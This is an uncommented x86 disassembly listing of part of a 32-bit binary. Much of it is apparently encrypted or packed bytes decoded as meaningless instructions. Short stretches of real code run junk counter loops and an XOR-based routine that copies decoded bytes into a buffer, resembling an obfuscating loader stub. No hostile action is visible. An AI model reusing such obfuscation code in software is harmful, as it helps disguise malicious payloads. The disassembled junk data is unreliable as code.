  4029d4:	ins    DWORD PTR es:[edi],dx
  4029d5:	cmp    BYTE PTR [ecx],dl
  4029d7:	xchg   ecx,eax
  4029d8:	iret   
  4029d9:	mov    DWORD PTR [ebx],esi
  4029db:	adc    ch,BYTE PTR [esi+0x38]
  4029de:	or     DWORD PTR [esi-0x6],esi
  4029e1:	push   es
  4029e2:	xlat   BYTE PTR ds:[ebx]
  4029e3:	(bad)
  4029e6:	ret    
  4029e7:	mov    al,0xe2
  4029e9:	call   0xbb49:0xbce18616
  4029f0:	inc    ebp
  4029f1:	aam    0xa8
  4029f3:	pop    esp
  4029f4:	ret    
  4029f5:	stc    
  4029f6:	fwait
  4029f7:	cmp    eax,0xf12144c3
  4029fc:	mov    ebp,0xc8554a43
  402a01:	loope  0x4029c3
  402a03:	shl    cl,cl
  402a05:	daa    
  402a06:	push   ecx
  402a07:	call   0xf9e35200
  402a0c:	iret   
  402a0d:	(bad)  
  402a0e:	mov    WORD PTR [ebx],fs
  402a10:	and    BYTE PTR [edi],al
  402a12:	cld    
  402a13:	sub    BYTE PTR [esi+0x4e2c4bce],ch
  402a19:	inc    ebp
  402a1a:	icebp  
  402a1b:	jmp    0x2ab3:0xf7380827
  402a22:	sbb    DWORD PTR [edx+0x21],esp
  402a25:	inc    eax
  402a26:	or     al,0xa0
  402a28:	push   ds
  402a29:	cmp    esi,DWORD PTR [esi]
  402a2b:	add    edi,DWORD PTR [ebp-0x55]
  402a2e:	mov    fs:0x7bc6b673,al
  402a34:	shl    BYTE PTR [ebp-0x55ac02ae],0x53
  402a3b:	in     eax,dx
  402a3c:	arpl   cx,dx
  402a3e:	xchg   esp,eax
  402a3f:	add    esi,0x299a8f6e
  402a45:	add    cl,BYTE PTR ds:0x5cd21ccf
  402a4b:	(bad)  
  402a4c:	daa    
  402a4d:	shl    DWORD PTR [ecx-0x38],cl
  402a50:	pop    edx
  402a51:	(bad)  
  402a53:	ror    BYTE PTR [esi],0x7a
  402a56:	outs   dx,BYTE PTR ds:[esi]
  402a57:	(bad)  [esi]
  402a59:	ret    
  402a5a:	inc    edx
  402a5b:	loop   0x402a05
  402a5d:	push   edi
  402a5e:	fnstcw WORD PTR [eax]
  402a60:	cs cmc 
  402a62:	xchg   ebp,eax
  402a63:	pushf  
  402a64:	movlps xmm0,QWORD PTR [esi+0x75ef5224]
  402a6b:	(bad)  
  402a6c:	xor    BYTE PTR ds:0x3434a42,dl
  402a72:	sbb    al,0x1a
  402a74:	jmp    0x402b47
  402a79:	in     al,dx
  402a7a:	test   eax,0xb57d3fe8
  402a7f:	sti    
  402a80:	mov    ecx,0xb7fd3b83
  402a85:	dec    esi
  402a86:	cmp    al,0x8
  402a88:	popf   
  402a89:	or     al,0xf
  402a8b:	jl     0x402b09
  402a8d:	mov    ds:0x787c7c7c,al
  402a92:	pop    ebp
  402a93:	pop    edi
  402a94:	pop    esp
  402a95:	xchg   ebx,eax
  402a96:	icebp  
  402a97:	shr    eax,cl
  402a99:	aad    0xf7
  402a9b:	fwait
  402a9c:	pop    ebp
  402a9d:	or     DWORD PTR [ecx-0x273c4caf],eax
  402aa3:	imul   eax,DWORD PTR [edi+0x1e2786a1],0x2c
  402aaa:	and    eax,0x89f8e36e
  402aaf:	and    eax,0xf369846e
  402ab4:	out    dx,eax
  402ab5:	sbb    bl,BYTE PTR ss:[esi+0xe70a413]
  402abc:	in     eax,dx
  402abd:	lods   eax,DWORD PTR ds:[esi]
  402abe:	jecxz  0x402ac1
  402ac0:	push   cs
  402ac1:	pop    edx
  402ac2:	xchg   edx,eax
  402ac3:	jg     0x402aa7
  402ac5:	fdiv   QWORD PTR [ebx]
  402ac7:	push   esp
  402ac8:	ja     0x402b2c
  402aca:	inc    edx
  402acb:	cmp    al,0x60
  402acd:	or     dl,BYTE PTR [ebx+0x179e285c]
  402ad3:	push   esp
  402ad4:	adc    eax,0x4c087171
  402ad9:	fdivr  DWORD PTR [esi+eiz*4-0x19]
  402add:	in     eax,dx
  402ade:	popa   
  402adf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ae0:	sbb    eax,0xed26bf6d
  402ae5:	jecxz  0x402b57
  402ae7:	mov    bh,0x35
  402ae9:	sbb    al,0xf5
  402aeb:	cmp    al,0x95
  402aed:	shl    DWORD PTR [edi+0x62],cl
  402af0:	xchg   esi,eax
  402af1:	retf   
  402af2:	pop    ebp
  402af3:	mov    esi,0x6ef356a5
  402af8:	pop    ebx
  402af9:	xchg   esp,eax
  402afa:	ds call 0xb47c:0x50b1a197
  402b02:	jae    0x402b01
  402b04:	jne    0x402a89
  402b06:	lods   al,BYTE PTR ds:[esi]
  402b07:	in     al,0x32
  402b09:	lea    edi,[ebp-0x34]
  402b0c:	bound  esp,QWORD PTR [esi]
  402b0e:	arpl   WORD PTR [ecx+0x4],dx
  402b11:	xor    eax,0x48bc3136
  402b16:	pop    edi
  402b17:	popa   
  402b18:	and    al,0x62
  402b1a:	xchg   BYTE PTR [eax-0x1b1c32c8],ah
  402b20:	mov    ah,0x62
  402b22:	mov    eax,ds:0x5ee890e9
  402b27:	ja     0x402ac3
  402b29:	mov    ebx,0xada26551
  402b2e:	or     al,bl
  402b30:	mov    edx,0x977fbe2a
  402b35:	xor    eax,0xdf05b821
  402b3a:	ror    DWORD PTR [ecx+0x363e472b],0x98
  402b41:	pop    edx
  402b42:	fcmovu st,st(5)
  402b44:	loop   0x402b47
  402b46:	xor    DWORD PTR [ebx+0x33],ecx
  402b49:	rol    BYTE PTR [ecx],cl
  402b4b:	pop    ebp
  402b4c:	hlt    
  402b4d:	jmp    0x402c20
  402b52:	dec    ebx
  402b53:	jge    0x402bcf
  402b55:	cmp    BYTE PTR [edx-0x7d],0x6d
  402b59:	jge    0x402b07
  402b5b:	push   cs
  402b5c:	loope  0x402b36
  402b5e:	mov    dl,BYTE PTR [esi+0xfb2e662]
  402b64:	jl     0x402be2
  402b66:	mov    ds:0xf57c7c7c,al
  402b6b:	mov    bl,0x59
  402b6d:	mul    BYTE PTR [eax+edx*4-0x51ae4367]
  402b74:	scas   eax,DWORD PTR es:[edi]
  402b75:	adc    esi,DWORD PTR [edx]
  402b77:	loopne 0x402bf6
  402b79:	ss es jecxz 0x402bcd
  402b7d:	jno    0x402bd0
  402b7f:	mov    ebp,DWORD PTR [eax-0x3b8b7291]
  402b85:	sti    
  402b86:	sub    al,0xf6
  402b88:	in     al,dx
  402b89:	out    dx,al
  402b8a:	or     al,0xc
  402b8c:	dec    eax
  402b8d:	jo     0x402b65
  402b8f:	aas    
  402b90:	pusha  
  402b91:	pop    edi
  402b92:	cmp    eax,0x65eeea90
  402b97:	pop    es
  402b98:	jnp    0x402b22
  402b9a:	mov    bl,0x96
  402b9c:	inc    edi
  402b9d:	and    bh,BYTE PTR [ecx+0x42]
  402ba0:	aaa    
  402ba1:	mov    edi,0xaf6171a5
  402ba6:	mov    cl,0x56
  402ba8:	push   esp
  402ba9:	add    ah,BYTE PTR [edx]
  402bab:	test   al,0x7b
  402bad:	xor    BYTE PTR [edi],al
  402baf:	je     0x402be5
  402bb1:	jl     0x402c26
  402bb3:	icebp  
  402bb4:	xchg   ecx,eax
  402bb5:	lea    edi,[ebp+0x25f857cf]
  402bbb:	xchg   edx,eax
  402bbc:	adc    DWORD PTR [edx+eax*2+0x2f26e722],edi
  402bc3:	mov    cl,0x54
  402bc5:	fxch   st(4)
  402bc7:	xor    BYTE PTR [edi],0x60
  402bca:	mov    dh,bl
  402bcc:	mov    al,0xc6
  402bce:	les    eax,FWORD PTR [edx+edx*2+0x3d]
  402bd2:	add    al,0x78
  402bd4:	aas    
  402bd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bd6:	jne    0x402be3
  402bd8:	stos   DWORD PTR es:[edi],eax
  402bd9:	sahf   
  402bda:	ins    BYTE PTR es:[edi],dx
  402bdb:	adc    DWORD PTR [edx+0x37],esp
  402bde:	mov    ch,0x71
  402be0:	cwde   
  402be1:	stc    
  402be2:	sub    edi,esp
  402be4:	or     ch,BYTE PTR [ecx-0x1f]
  402be7:	leave  
  402be8:	pop    ecx
  402be9:	ret    0x310b
  402bec:	sbb    al,0x54
  402bee:	nop
  402bef:	popf   
  402bf0:	stos   BYTE PTR es:[edi],al
  402bf1:	daa    
  402bf2:	jg     0x402b7e
  402bf4:	cmp    BYTE PTR [ebp+ebx*2+0x70f59b04],ch
  402bfb:	or     eax,0x4fa9e431
  402c00:	and    esp,0xffffff9a
  402c03:	imul   edx,DWORD PTR [edi+0xb],0xffffff89
  402c07:	ins    BYTE PTR es:[edi],dx
  402c08:	mov    ds:0x3f1502e0,eax
  402c0d:	aad    0xfd
  402c0f:	rol    BYTE PTR [ecx+0x28],cl
  402c12:	pop    esp
  402c13:	test   eax,0xa93230c9
  402c18:	and    BYTE PTR [ebp+edi*2+0x35],cl
  402c1c:	lds    esp,FWORD PTR [ebp-0x74a4f662]
  402c22:	inc    ebp
  402c23:	hlt    
  402c24:	pop    edi
  402c25:	pop    esi
  402c26:	pop    ebx
  402c27:	leave  
  402c28:	ret    0x10
  402c2b:	push   ebp
  402c2c:	mov    ebp,esp
  402c2e:	sub    esp,0x20
  402c31:	leave  
  402c32:	ret    0x10
  402c35:	push   ebp
  402c36:	mov    ebp,esp
  402c38:	push   ecx
  402c39:	and    DWORD PTR ds:0x41341a,0x0
  402c43:	jmp    0x402c56
  402c48:	xor    eax,eax
  402c4a:	xor    eax,DWORD PTR ds:0x41341a
  402c50:	inc    eax
  402c51:	mov    ds:0x41341a,eax
  402c56:	cmp    DWORD PTR ds:0x41341a,0x1e
  402c5d:	jae    0x402d01
  402c63:	cmp    DWORD PTR ds:0x41341a,0x11
  402c6a:	jne    0x402c83
  402c70:	push   0x0
  402c72:	push   0x4427c0
  402c77:	push   DWORD PTR [ebp-0x20]
  402c7a:	push   DWORD PTR [ebp-0x14]
  402c7d:	call   DWORD PTR ds:0x43c5b0
  402c83:	cmp    DWORD PTR ds:0x41341a,0x10
  402c8a:	jne    0x402c9e
  402c90:	xor    eax,eax
  402c92:	add    eax,DWORD PTR ds:0x41341a
  402c98:	inc    eax
  402c99:	mov    ds:0x41341a,eax
  402c9e:	jmp    0x402c48
  402ca3:	and    DWORD PTR ds:0x43fbfc,0x0
  402cad:	mov    edx,DWORD PTR ds:0x43fbfc
  402cb3:	inc    edx
  402cb4:	mov    DWORD PTR ds:0x43fbfc,edx
  402cba:	cmp    DWORD PTR ds:0x43fbfc,0xd
  402cc1:	jne    0x402cda
  402cc7:	push   0x413416
  402ccc:	push   DWORD PTR [ebp-0x28]
  402ccf:	push   0x3f88
  402cd4:	call   DWORD PTR ds:0x43c4e0
  402cda:	cmp    DWORD PTR ds:0x43fbfc,0xc
  402ce1:	jne    0x402cf4
  402ce7:	mov    edx,DWORD PTR ds:0x43fbfc
  402ced:	inc    edx
  402cee:	mov    DWORD PTR ds:0x43fbfc,edx
  402cf4:	cmp    DWORD PTR ds:0x43fbfc,0x17
  402cfb:	jb     0x402cad
  402d01:	push   ecx
  402d02:	mov    eax,0xf89c8535
  402d07:	mov    DWORD PTR ds:0x41340e,0x10
  402d11:	cmp    DWORD PTR ds:0x41340e,0x0
  402d18:	je     0x402d61
  402d1e:	cmp    DWORD PTR ds:0x41340e,0x1d
  402d25:	jne    0x402d4f
  402d2b:	push   0x4427a8
  402d30:	push   0x4427a8
  402d35:	push   0x8e35
  402d3a:	push   0x41082b
  402d3f:	push   0x4107f1
  402d44:	push   0x4107a7
  402d49:	call   DWORD PTR ds:0x43c828
  402d4f:	mov    edx,DWORD PTR ds:0x41340e
  402d55:	dec    edx
  402d56:	mov    DWORD PTR ds:0x41340e,edx
  402d5c:	jmp    0x402d11
  402d61:	mov    DWORD PTR [ebp-0x8],eax
  402d64:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  402d6b:	mov    edx,DWORD PTR [ebp-0x8]
  402d6e:	push   esi
  402d6f:	mov    ecx,0x7510857
  402d74:	xor    edx,ecx
  402d76:	mov    esi,0x32729e
  402d7b:	push   edi
  402d7c:	mov    edi,DWORD PTR [ebp+0x10]
  402d7f:	add    edx,esi
  402d81:	cmp    edi,edx
  402d83:	je     0x403249
  402d89:	mov    edx,DWORD PTR [ebp-0x8]
  402d8c:	mov    eax,DWORD PTR [ebp-0x4]
  402d8f:	xor    eax,ecx
  402d91:	mov    edi,0xffcd8d62
  402d96:	sub    edi,eax
  402d98:	add    edi,DWORD PTR [ebp+0x10]
  402d9b:	xor    edx,ecx
  402d9d:	add    edx,esi
  402d9f:	cmp    edx,edi
  402da1:	ja     0x4030d5
  402da7:	jmp    0x402f16
  402dac:	sbb    eax,0xa4b3a405
  402db1:	ins    DWORD PTR es:[edi],dx
  402db2:	std    
  402db3:	pop    ebp
  402db4:	mov    eax,0xd4e45e2b
  402db9:	sbb    edx,DWORD PTR [edi+0x7c0ef8c1]
  402dbf:	jl     0x402d8f
  402dc1:	jg     0x402e3f
  402dc3:	jl     0x402dc3
  402dc5:	xor    al,0x14
  402dc7:	mov    ch,0x4e
  402dc9:	adc    BYTE PTR [ebp-0x95ea63d],0x94
  402dd0:	sahf   
  402dd1:	push   ss
  402dd2:	xchg   BYTE PTR [edx+0x41],al
  402dd5:	lds    edx,FWORD PTR [eax]
  402dd7:	xchg   edi,eax
  402dd8:	add    BYTE PTR [esi-0x1c],dl
  402ddb:	std    
  402ddc:	cmc    
  402ddd:	and    edi,eax
  402ddf:	lods   al,BYTE PTR ds:[esi]
  402de0:	sub    eax,0x7f267c29
  402de5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402de6:	cld    
  402de7:	repnz mov gs,esp
  402dea:	mov    dh,0x79
  402dec:	scas   eax,DWORD PTR es:[edi]
  402ded:	xchg   edi,eax
  402dee:	pop    ds
  402def:	sub    DWORD PTR [edx],edx
  402df1:	or     DWORD PTR [esi+0x2284f904],esi
  402df7:	xchg   ebp,eax
  402df8:	stos   DWORD PTR es:[edi],eax
  402df9:	adc    eax,0xf3130bab
  402dfe:	jle    0x402def
  402e00:	dec    edx
  402e01:	sahf   
  402e02:	daa    
  402e03:	cmp    BYTE PTR [ecx+0x31968f05],dl
  402e09:	adc    DWORD PTR [edx],ebp
  402e0b:	mov    esi,0x506351a3
  402e10:	mov    esi,0xabf2d632
  402e15:	les    ebx,FWORD PTR [ecx+edx*1]
  402e18:	mov    edx,0x1fe7ea37
  402e1d:	push   ds
  402e1e:	mov    DWORD PTR [ecx+eiz*1+0x78],0x119b2809
  402e26:	mov    al,0xcf
  402e28:	stos   BYTE PTR es:[edi],al
  402e29:	push   esp
  402e2a:	ins    BYTE PTR es:[edi],dx
  402e2b:	mov    DWORD PTR [edi+0x2b],ebx
  402e2e:	fs jp  0x402e9a
  402e31:	push   edx
  402e32:	sahf   
  402e33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e34:	ret    0x2f6f
  402e37:	rep outs dx,DWORD PTR ds:[esi]
  402e39:	fyl2xp1 
  402e3b:	dec    edi
  402e3c:	(bad)  
  402e3e:	mov    dl,0xde
  402e40:	or     al,0x1d
  402e42:	sub    DWORD PTR [eax+ebx*2],0xbfa6b632
  402e49:	add    DWORD PTR [edx+0x9eeb60a],ecx
  402e4f:	popf   
  402e50:	mov    WORD PTR [ecx-0x99240ce],cs
  402e56:	out    dx,eax
  402e57:	idiv   eax
  402e59:	mov    ds:0xe137e67e,al
  402e5e:	xor    cl,BYTE PTR [edi+0x4a]
  402e61:	and    BYTE PTR [eax],cl
  402e63:	mov    dl,0xd3
  402e65:	lods   al,BYTE PTR ds:[esi]
  402e66:	xchg   ebp,eax
  402e67:	push   esi
  402e68:	lds    esp,FWORD PTR [edi]
  402e6a:	add    cl,BYTE PTR [edx+0x24]
  402e6d:	add    ah,al
  402e6f:	pop    esp
  402e70:	nop
  402e71:	aaa    
  402e72:	stos   DWORD PTR es:[edi],eax
  402e73:	lahf   
  402e74:	bound  ebx,QWORD PTR [esi-0x2d28442d]
  402e7a:	add    eax,0xd5f71ea0
  402e7f:	retf   0x2a90
  402e82:	(bad)  
  402e84:	cmc    
  402e85:	adc    esp,esi
  402e87:	dec    ebp
  402e88:	fsub   QWORD PTR [ebx]
  402e8a:	jmp    0x860d:0xdb2d95b8
  402e91:	test   ebp,esp
  402e93:	lds    ebp,FWORD PTR [ecx-0x2ef43c2c]
  402e99:	cmc    
  402e9a:	pop    ebp
  402e9b:	in     eax,dx
  402e9c:	repz adc DWORD PTR [edi+0x29855e43],ebx
  402ea3:	(bad)  
  402ea4:	pushf  
  402ea5:	mov    ah,0xe3
  402ea7:	gs test al,0x1b
  402eaa:	leave  
  402eab:	xchg   DWORD PTR [ebx+edx*2-0x5824b7bf],ecx
  402eb2:	jo     0x402e3d
  402eb4:	scas   eax,DWORD PTR es:[edi]
  402eb5:	(bad)  [edx+eiz*4-0x2da4b2e0]
  402ebc:	adc    BYTE PTR ds:0xc9855fc0,ah
  402ec2:	push   cs
  402ec3:	scas   al,BYTE PTR es:[edi]
  402ec4:	sbb    dh,BYTE PTR [edx-0x61]
  402ec7:	js     0x402e80
  402ec9:	add    eax,0xad8fb79d
  402ece:	push   ds
  402ecf:	cmp    al,0xe7
  402ed1:	jmp    0x9c5a2b0d
  402ed6:	rcr    BYTE PTR [ebx+0x20],cl
  402ed9:	pop    ebp
  402eda:	ror    BYTE PTR [eax-0xbe1856e],0xf7
  402ee1:	pop    ecx
  402ee2:	pop    ds
  402ee3:	xchg   dh,dh
  402ee5:	or     BYTE PTR [edi],0x8a
  402ee8:	push   edx
  402ee9:	cli    
  402eea:	mov    al,0x75
  402eec:	mov    bl,0x5c
  402eee:	das    
  402eef:	cli    
  402ef0:	pop    esp
  402ef1:	aad    0x99
  402ef3:	aad    0xb6
  402ef5:	fiadd  WORD PTR [ecx+ecx*2+0x23]
  402ef9:	lds    edx,FWORD PTR [edi]
  402efb:	jmp    0xb060db
  402f00:	retf   0xb7c9
  402f03:	(bad)  
  402f04:	push   esp
  402f05:	inc    esi
  402f06:	sub    ebp,DWORD PTR [ecx-0x5e54f4a9]
  402f0c:	inc    ebp
  402f0d:	repnz push 0x4fb6451b
  402f13:	mov    edx,0xe953b21e
  402f18:	add    eax,0xbe000000
  402f1d:	sahf   
  402f1e:	jb     0x402f52
  402f20:	add    BYTE PTR [ebx+0x7d8bf845],cl
  402f26:	cld    
  402f27:	xor    edi,ecx
  402f29:	add    edi,esi
  402f2b:	mov    esi,DWORD PTR [ebp+0x8]
  402f2e:	imul   edi,edx
  402f31:	mov    ebx,DWORD PTR [ebp+0xc]
  402f34:	xor    eax,ecx
  402f36:	add    eax,edx
  402f38:	mov    al,BYTE PTR [ebx+eax*1+0x32729e]
  402f3f:	mov    BYTE PTR [edi+esi*1],al
  402f42:	mov    eax,DWORD PTR [ebp-0x4]
  402f45:	xor    eax,ecx
  402f47:	lea    edx,[edx+eax*1+0x32729e]
  402f4e:	mov    eax,DWORD PTR [ebp-0x4]
  402f51:	xor    eax,ecx
  402f53:	mov    esi,0xffcd8d62
  402f58:	sub    esi,eax
  402f5a:	add    esi,DWORD PTR [ebp+0x10]
  402f5d:	jmp    0x4030cc
  402f62:	jp     0x402f87
  402f64:	pop    ebp
  402f65:	cmp    BYTE PTR [ebp+0x7a],bl
  402f68:	jge    0x402fcf
  402f6a:	mov    ss,WORD PTR [ebp+0x4f]
  402f6d:	push   edx
  402f6e:	and    edx,DWORD PTR [esi]
  402f70:	popa   
  402f71:	mov    esp,0x7c7c014a
  402f76:	into   
  402f77:	jg     0x402ff5
  402f79:	jl     0x402fe6
  402f7b:	or     ah,ah
  402f7d:	cmp    BYTE PTR [ecx+0x7f],al
  402f80:	out    dx,al
  402f81:	add    DWORD PTR [ebx],eax
  402f83:	pop    ebp
  402f84:	test   al,0x58
  402f86:	out    0xd8,eax
  402f88:	pop    edx
  402f89:	mov    dh,0xc9
  402f8b:	dec    ebx
  402f8c:	cmp    BYTE PTR [ebp-0x23b9a648],dl
  402f92:	push   0xfffffff5
  402f94:	clc    
  402f95:	push   esi
  402f96:	outs   dx,DWORD PTR ds:[esi]
  402f97:	test   DWORD PTR [ecx-0x5f],ebp
  402f9a:	lock sub al,0x8
  402f9d:	(bad)  
  402f9e:	loope  0x402ffa
  402fa0:	lock sbb al,0x20
  402fa3:	pop    eax
  402fa4:	mov    ch,0x42
  402fa6:	add    ch,dh
  402fa8:	aaa    
  402fa9:	and    eax,0x90b0e098
  402fae:	in     al,dx
  402faf:	lods   eax,DWORD PTR ds:[esi]
  402fb0:	shl    DWORD PTR [esi],0xf
  402fb3:	std    
  402fb4:	mov    esi,esi
  402fb6:	data16 (bad) 
  402fb9:	mov    edx,0xe0739675
  402fbe:	iret   
  402fbf:	in     eax,dx
  402fc0:	inc    ebx
  402fc1:	lahf   
  402fc2:	jmp    0x1714f1d7
  402fc7:	jbe    0x402fb8
  402fc9:	std    
  402fca:	and    eax,0x680e1fac
  402fcf:	xchg   DWORD PTR [eax+0x48bf6d2e],ebx
  402fd5:	aam    0xf7
  402fd7:	sub    DWORD PTR [edx],edi
  402fd9:	jo     0x402f71
  402fdb:	and    edi,DWORD PTR [edi+ecx*2]
  402fde:	cmp    eax,DWORD PTR [ecx]
  402fe0:	not    edx
  402fe2:	ds test eax,0x572e6773
  402fe8:	push   eax
  402fe9:	lea    esp,[ebx+0x2634439e]
  402fef:	push   edi
  402ff0:	or     edx,DWORD PTR [ecx-0x3b]
  402ff3:	ja     0x402f9c
  402ff5:	mov    dl,0xf4
  402ff7:	mov    edi,0x75326c27
  402ffc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ffd:	retf   
  402ffe:	cdq    
  402fff:	pop    edx
  403000:	push   ds
  403001:	mov    al,0xdf
  403003:	int    0x98
  403005:	(bad)  
  403006:	pop    edx
  403007:	dec    ebp
  403008:	push   0x4d
  40300a:	dec    edi
  40300b:	xchg   esi,eax
  40300c:	lds    edx,FWORD PTR [ecx-0x73]
  40300f:	call   0xe111:0x67245d78
  403016:	xchg   esp,eax
  403017:	and    eax,0xc3ceb402
  40301c:	cmp    al,0x4e
  40301e:	aas    
  40301f:	cmp    dl,BYTE PTR [ebx]
  403021:	sbb    al,bh
  403023:	mov    cl,0x6a
  403025:	pop    ecx
  403026:	scas   eax,DWORD PTR es:[edi]
  403027:	push   0xb2fca708
  40302c:	rcr    DWORD PTR [eax-0x29fa76de],1
  403032:	jae    0x402ff5
  403034:	inc    edx
  403035:	arpl   WORD PTR [eax-0x1f],di
  403038:	add    DWORD PTR [eax+0x62],eax
  40303b:	cmp    BYTE PTR ds:0x48ead158,ah
  403041:	lods   al,BYTE PTR ds:[esi]
  403042:	add    al,0x74
  403044:	pop    esi
  403045:	push   0x12
  403047:	fisub  WORD PTR [eax+0x13089137]
  40304d:	jae    0x40306b
  40304f:	push   0x6c4c7284
  403054:	mov    eax,ds:0x37ac2342
  403059:	mov    eax,ds:0x263b55ea
  40305e:	in     al,dx
  40305f:	enter  0x627,0x48
  403063:	les    ebx,FWORD PTR [edx]
  403065:	cmc    
  403066:	icebp  
  403067:	in     al,0xb7
  403069:	inc    ecx
  40306a:	inc    esp
  40306b:	jb     0x40308f
  40306d:	mov    ds:0x14eb578a,eax
  403072:	jbe    0x403087
  403074:	imul   edi,DWORD PTR [edx-0x34485b1d],0x4fa3f15e
  40307e:	icebp  
  40307f:	aam    0x9f
  403081:	in     al,dx
  403082:	cwde   
  403083:	mov    ecx,0x2245fcc3
  403088:	sub    BYTE PTR [ebx-0x11],ch
  40308b:	inc    ah
  40308d:	iret   
  40308e:	call   0xd7379a14
  403093:	push   ds
  403094:	popa   
  403095:	lods   al,BYTE PTR ds:[esi]
  403096:	pop    ebx
  403097:	sbb    esi,DWORD PTR [esi-0x59f8bf35]
  40309d:	and    BYTE PTR [edx],dh
  40309f:	push   ss
  4030a0:	mov    esp,0xcf3cc846
  4030a5:	clc    
  4030a6:	adc    al,0x12
  4030a8:	dec    ebp
  4030a9:	mov    eax,ds:0x3a500c5a
  4030ae:	mov    ebp,0x29e5cb9f
  4030b3:	int    0xe5
  4030b5:	inc    esp
  4030b6:	push   ebx
  4030b7:	push   eax
  4030b8:	mov    cl,0xb2
  4030ba:	or     al,0xd6
  4030bc:	jle    0x4030d9
  4030be:	inc    esi
  4030bf:	int    0xd4
  4030c1:	sub    eax,0x6ddf8856
  4030c6:	(bad)  
  4030c7:	mov    es,ebx
  4030c9:	dec    ebp
  4030ca:	fsubr  DWORD PTR [ecx+0x3b]
  4030cd:	(bad)  
  4030ce:	jbe    0x402f1c
  4030d4:	pop    ebx
  4030d5:	mov    eax,0xf89c8534
  4030da:	jmp    0x403249
  4030df:	jno    0x403104
  4030e1:	in     al,0x69
  4030e3:	cli    
  4030e4:	ins    DWORD PTR es:[edi],dx
  4030e5:	cmp    DWORD PTR [ebx+0x12],0xc1299de8
  4030ec:	xor    BYTE PTR [eax-0x51],0x1c
  4030f0:	add    edi,DWORD PTR [esp+edi*2-0x32]
  4030f4:	jg     0x403172
  4030f6:	jl     0x40308b
  4030f8:	mov    DWORD PTR [eax+0x10],ebp
  4030fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030fc:	mov    eax,0x982f1f35
  403101:	jno    0x403174
  403103:	nop
  403104:	adc    ebp,ebp
  403106:	pusha  
  403107:	pop    ds
  403108:	xchg   esp,eax
  403109:	leave  
  40310a:	repz cmp edx,edi
  40310d:	adc    al,0x58
  40310f:	loop   0x403187
  403111:	push   esi
  403112:	jge    0x403148
  403114:	cwde   
  403115:	and    eax,0x9726f384
  40311a:	rol    ah,cl
  40311c:	push   eax
  40311d:	loop   0x403105
  40311f:	in     al,dx
  403120:	lods   al,BYTE PTR ds:[esi]
  403121:	mov    al,0xc6
  403123:	ins    DWORD PTR es:[edi],dx
  403124:	sahf   
  403125:	mov    ds:0x6446e944,eax
  40312a:	and    eax,DWORD PTR [ebx+0x53]
  40312d:	jecxz  0x403113
  40312f:	xchg   esi,eax
  403130:	mov    dh,0x15
  403132:	cli    
  403133:	nop
  403134:	push   edi
  403135:	xor    al,0x54
  403137:	sub    al,0x51
  403139:	cwde   
  40313a:	xchg   ebp,eax
  40313b:	fldenv [ebx]
  40313d:	lods   al,BYTE PTR ds:[esi]
  40313e:	xchg   edi,eax
  40313f:	pop    es
  403140:	push   ecx
  403141:	xor    al,0x94
  403143:	inc    esi
  403144:	adc    al,ch
  403146:	xor    al,0x7b
  403148:	mov    bh,0x2d
  40314a:	in     eax,dx
  40314b:	pop    ds
  40314c:	cli    
  40314d:	mov    esi,0xe8aa3c6e
  403152:	mov    bh,0xc4
  403154:	lahf   
  403155:	dec    esp
  403156:	add    eax,0xf8d21aac
  40315b:	in     al,0x56
  40315d:	call   0xd0d8:0x883ff2b9
  403164:	int3   
  403165:	idiv   BYTE PTR [eax-0x3e]
  403168:	jge    0x4031c9
  40316a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40316b:	mov    ds:0xf278cfac,eax
  403170:	dec    ecx
  403171:	retf   
  403172:	bound  edi,QWORD PTR ds:0x2d0deeac
  403178:	jns    0x40314c
  40317a:	(bad)  
  40317b:	pop    ebx
  40317c:	ja     0x403112
  40317e:	loope  0x403161
  403180:	int    0x7a
  403182:	jmp    FWORD PTR [eax-0x16]
  403185:	xchg   DWORD PTR [esi],ecx
  403187:	cdq    
  403188:	shl    BYTE PTR [esi-0x6f],1
  40318b:	arpl   ax,si
  40318d:	fs jae 0x403128
  403190:	jne    0x403145
  403192:	loopne 0x403116
  403194:	or     ch,ch
  403196:	lahf   
  403197:	ja     0x40319b
  403199:	lahf   
  40319a:	jle    0x40319f
  40319c:	and    dh,ch
  40319e:	adc    al,0x83
  4031a0:	adc    eax,0x216db157
  4031a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031a6:	mov    bl,0x76
  4031a8:	or     DWORD PTR [ebx+0x48],esi
  4031ab:	push   ss
  4031ac:	jmp    0x7869:0x63b48b1b
  4031b3:	and    DWORD PTR [edi-0xf],ebx
  4031b6:	sbb    ebx,DWORD PTR [edx+eiz*1]
  4031b9:	or     ch,BYTE PTR ds:0x5038d8ee
  4031bf:	(bad)  
  4031c0:	sti    
  4031c1:	mov    eax,0x92f93c19
  4031c6:	mov    ds:0xfb0de3b4,al
  4031cb:	push   cs
  4031cc:	jns    0x40320b
  4031ce:	sub    cl,BYTE PTR [eax]
  4031d0:	jns    0x403227
  4031d2:	xor    DWORD PTR [ebx],esi
  4031d4:	not    DWORD PTR [ebp-0x717cf99c]
  4031da:	scas   al,BYTE PTR es:[edi]
  4031db:	lods   al,BYTE PTR ds:[esi]
  4031dc:	sbb    al,0x23
  4031de:	xchg   esi,eax
  4031df:	imul   ebx,DWORD PTR [edx],0xffffffcc
  4031e2:	es dec edx
  4031e4:	inc    ebx
  4031e5:	fnsave [ebx-0x14]
  4031e8:	jo     0x403195
  4031ea:	fisub  DWORD PTR [esi]
  4031ec:	fstp   QWORD PTR [edi+0x63]
  4031ef:	sbb    dl,ah
  4031f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031f2:	xchg   esp,eax
  4031f3:	mov    eax,ds:0xd831189b
  4031f8:	cmp    edx,DWORD PTR [edi-0x80]
  4031fb:	(bad)  
  4031fc:	dec    DWORD PTR [ecx-0xcf38147]
  403202:	retf   
  403203:	add    al,0x11
  403205:	popa   
  403206:	lahf   
  403207:	(bad)  
  403208:	retf   
  403209:	test   BYTE PTR [ecx],ch
  40320b:	pop    edi
  40320c:	push   ds
  40320d:	cmc    
  40320e:	(bad)  
  40320f:	or     ebx,ebp
  403211:	adc    cl,0xbe
